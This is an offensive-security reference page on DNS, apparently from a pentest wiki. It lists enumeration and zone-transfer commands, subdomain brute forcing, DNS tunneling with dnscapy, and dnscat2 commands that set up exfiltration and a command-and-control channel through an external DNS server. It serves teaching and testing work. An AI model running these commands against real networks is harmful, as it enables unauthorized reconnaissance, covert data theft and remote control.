---
authors: ShutdownRepo, Tednoob17
---

# 🛠️ DNS

## Theory
DNS lets users connect to websites using domain names instead of IP addresses. The Domain Name System (DNS) is the phonebook of the Internet.
Humans access information online through domain names, like thehacker.recipes. Web browsers interact through Internet Protocol (IP) addresses.
DNS translates domain names to IP addresses so browsers can load Internet resources.

The default port of DNS is 53.

## Enumeration
### Automation

:::tabs

=== dig
The dig command is a powerful network tool for querying (DNS) servers.
It helps diagnose and resolve DNS-related problems, essential for maintaining network stability and performance.

```bash
# Dns Query
dig thehacker.recipes

# Querying a dns record type (A record for ip address)
dig  thehacker.recipes A

# Querying a name server record list
dig  thehacker.recipes NS

# Tracing the DNS path
dig thehacker.recipes  +trace
```
=== nslookup
Displays information that you can use to diagnose (DNS) infrastructure.

```bash
# Operate a DNS Query
nslookup thehacker.recipes

# Query a mail DNS record (MX record)
nslookup -type=MX thehacker.recipes

# Query a specific DNS server
nslookup thehacker.recipes $DNS_IP
```

=== host

host is a simple utility for performing Domain Name System lookups.

```bash
# Simple DNS Query
host thehacker.recipes

# Query a mail DNS record (MX record)
host -t MX thehacker.recipes

# Perform a reverse DNS lookup
host $IP_ADDRESS
```

=== whois

```bash
# Simple DNS Query
whois thehacker.recipes
```
:::

### Any Record Query

```bash
dig any thehacker.recipes @$IP_ADDR
```

### Zone Transfer
DNS zone transfers using the AXFR protocol are the simplest mechanism to replicate DNS records across DNS servers.

```bash
# With ip address
dig axfr @$DNS_IP

# With guessing the domain
dig axfr @$DNS_IP $DOMAIN

# Alternatively, you can use fierce for zone transfers or dictionary attacks
# DNS reconnaissance and subdomain enumeration tool with recursive search and wildcard detection.
fierce --domain $DOMAIN --dns-servers $DNS_IP
```

### Enumerate Hosts and Subdomains Brute Force
DNSRecon is a Python script for comprehensive DNS enumeration, including zone transfers, record lookups, brute-forcing, wildcard checks, TLD expansion, and cached record analysis.

```bash
# To enumerate subdomains of microsoft.com
dnsrecon -d microsoft.com

# Scan a domain, use a dictionary to brute force hostnames, do a standard scan, and save the output to a file
dnsrecon -d example.com -D $WORDLIST -t std --xml $OUTPUT.xml
```

### Google dorks
```dork
site:thehacker.recipes
```

## Attack

### DNS Tunneling
DNS tunneling is commonly used to circumvent security. Tunneling can be used for benign reasons. For example, an anti-virus update done by endpoint software.
However, it is also used for more malicious purposes, such as evading captive portals.

#### Setup using dnscapy

```bash
# On the server
sudo python dnscapy_server.py $DELEGATED_ZONE_NAME $EXTERNAL_IP_ADDR

# On the client
ssh -o ProxyCommand="sudo python dnscapy_client.py $DELEGATED_ZONE_NAME $IP_ADDR_OF_CLIENT_DNS" yourlogin@localhost
```
## Post-Exploitation


### DNS Exfiltration
DNS exfiltration is a technique where attackers encode data in DNS queries to steal information.

Exfiltration with dnscat2

This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.

```bash
# Server side
dnscat2 --dns server=$DNS_SERVER_IP:53

# Client side
dnscat2 $DOMAIN
```
### Cache Snooping

DNS cache snooping is a technique that can be employed for different purposes by those seeking to benefit from knowledge of what queries have been made of a recursive DNS server by its clients.

```bash
dig @$DNS-SERVER $DOMAIN +norecurse
```









## Resources
[Information Gathering-Web Edition](https://academy.hackthebox.com/module/144/section/1251)  
[Kali dnsrecon](https://www.kali.org/tools/dnsrecon)  
[DNS Attack](https://bluecatnetworks.com/blog/four-major-dns-attack-types-and-how-to-mitigate-them)  
[DNS Tunelling](https://www.blackhat.com/presentations/bh-usa-08/Miller/BH_US_08_Ty_Miller_Reverse_DNS_Tunneling_Shellcode.pdf)  
